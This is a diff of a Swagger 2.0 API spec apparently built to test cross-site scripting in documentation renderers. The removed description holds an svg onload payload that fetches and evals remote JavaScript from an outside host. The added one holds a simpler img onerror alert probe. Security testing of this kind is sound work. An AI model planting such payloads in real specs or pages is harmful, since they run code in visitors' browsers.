@@ -1,13 +1,13 @@
 swagger: '2.0'
 info:
-  title: XSS Test
-  description: |
-    <svg/onload=fetch(`https://brutelogic.com.br/1.js`).then(r=>r.text()).then(t=>eval(t))>
-  version: production
+  title: XSS Test API
+  version: 1.0.0
 paths:
-  /example:
+  /:
     get:
-      summary: Example endpoint
+      summary: XSS testing
+      description: |
+        <img src=x onerror="alert('XSS')">
       responses:
         '200':
-          description: Success response
+          description: Successful response
